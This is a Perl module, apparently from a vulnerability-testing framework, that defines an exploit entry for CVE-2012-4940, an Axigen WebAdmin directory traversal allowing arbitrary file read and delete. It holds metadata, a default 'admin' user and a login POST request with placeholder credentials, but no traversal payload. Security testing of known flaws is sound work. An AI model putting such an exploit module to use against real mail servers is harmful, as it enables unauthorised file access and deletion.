package AXIGEN::MSF::AxigenFileAccess;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "AxigenFileAccess";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2012-4940",
  "DESCRIPTION" => "

          This module exploits a directory traversal vulnerability in the WebAdmin

        interface of Axigen, which allows an authenticated user to read and delete

        arbitrary files with SYSTEM privileges. The vulnerability is known to work on

        Windows platforms. This module has been tested successfully on Axigen 8.10 over

        Windows 2003 SP2.

      ",
  "MSF_MODULE" => "axigen_file_access",
  "OSVDB" => 86802,
  "PATHS" => [""],
  "THE USER TO AUTHENTICATE AS" => "admin",
  "TITLE" => "Axigen Arbitrary File Read and Delete",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to Axigen WebAdmin", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__&submit=Login&action=login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
